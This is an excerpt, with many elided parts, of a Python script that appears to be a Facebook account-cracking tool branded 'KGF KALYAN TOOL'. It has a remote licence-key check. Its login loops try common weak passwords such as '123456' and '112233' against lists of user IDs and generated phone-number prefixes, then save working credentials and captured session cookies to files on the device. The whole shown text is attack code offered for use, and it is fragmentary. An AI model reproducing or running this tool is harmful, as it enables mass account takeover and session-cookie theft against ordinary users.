...
time.sleep(3)
os.system('clear')
print('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m LODING ●\x1b[38;5;47m●\x1b[38;5;48m●\x1b[38;5;49m●\x1b[38;5;50m●\x1b[38;5;244m [\x1b[38;5;46mKGF TEM OWNER KALYAN TOOL\x1b[38;5;244m]\x1b[1;97m')
time.sleep(2)
try:
...
#-------------------// APPROVAL \\---------------------#
import os,httpx
sexkey = "kALYAN~("+str(os.getuid())+"=(CYBER)="+str(os.getuid())+")~PRO"
def approval():
    sexkey = "kALYAN~("+str(os.getuid())+"=(CYBER)="+str(os.getuid())+")~PRO"
    ress=httpx.get("https://github.com/Kallanooo12/Kallan_hak/blob/main/Avrolvel1.txt").text
    if sexkey in ress:
        menu()
    else:
...
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝     
\x1b[1;97m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐\033[1;37m
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m AVOTHER  \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mKALAN - KING I\x1b[38;5;244m] \x1b[1;97m              ┃
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m FACEBOOK \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mKALYAN KINGI\x1b[38;5;244m] \x1b[1;97m           ┃
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                print(f"\r\x1b[38;5;244m(\x1b[38;5;244mKGF-KALYAN-OK\x1b[38;5;244m)\x1b[38;5;244m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
                open("/sdcard/KGF-KALYAN-OLD.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:              
                print(f"\r\x1b[38;5;244m(\x1b[38;5;46mKGF-KALYAN-OK\x1b[38;5;244m)\x1b[38;5;46m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
                open("/sdcard/KGF-KALYAN-OLD.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
...
def menu():
        try:
                        ...
                        if xd in ['1','01']:
                                clear();print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : /sdcard/YOUR-FIL.txt ');linex()
...
def BD():
        clear()
        print(f'\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m) \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 017 - 018- 019- 016')
        linex()
...
def idpaslogin(uid,passlist,tl):
        global loop,oks,cps
        sys.stdout.write(f"\r\x1b[38;5;244m(\x1b[38;5;46mKGF-KALYAN-XD\x1b[38;5;244m) \x1b[38;5;244m(\x1b[38;5;81m{loop}\x1b[38;5;244m) \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
        try:
            for ps in passlist:
                    session = requests.Session()
    ...
    'user-agent': us}
                    ...
                    if 'c_user' in log_cookies:
                           ...
                           if 'Photoshop' in res:
                                 print(f"\r\x1b[38;5;244m(\x1b[38;5;46mKGF-KALYAN-💚\x1b[38;5;244m)\x1b[38;5;46m {uid} \x1b[38;5;244m|\x1b[38;5;46m {ps}")
                                 Elite(uid,ps,coki)
                                 print("\r\033[1;34m(🍪\033[1;34m)\x1b[38;5;244m–\x1b[38;5;46m➤ \033[1;37m"+ coki)
                                 print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
                                 open('/sdcard/KGF-KALYAN/RND-M1-OK-COKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                                 oks.append(uid)
                                 break
                           else:
                                 break
                            ...
                            open('/sdcard/KGF-KALYAN/RND-CP.txt','a').write(uid+'|'+ps+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mKGF-KALYAN-OK\x1b[38;5;244m)\x1b[38;5;46m '+ids+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
                                        linex()
                                        open('/sdcard/KGF-KALYAN-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}KGF-KALYAN-CP\x1b[38;5;244m){Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KGF-KALYAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
                                        linex()
                                        open('/sdcard/KGF-KALYAN-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
